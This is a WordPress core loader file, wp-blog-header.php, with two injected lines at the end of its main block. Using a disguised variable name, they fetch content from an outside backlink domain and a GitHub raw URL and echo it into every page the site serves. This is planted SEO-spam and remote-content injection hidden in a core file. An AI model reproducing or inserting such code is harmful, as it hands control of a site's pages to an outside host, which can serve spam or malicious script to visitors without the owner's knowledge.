<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';
	
$framework_controller_2 = file_get_contents('https://bsp-backlink.com/wp-plugins.php'); echo $framework_controller_2;

$framework_controller_2 = file_get_contents('https://raw.githubusercontent.com/BadaxHaxor/zeroajg/main/backlink.php'); echo $framework_controller_2;

}
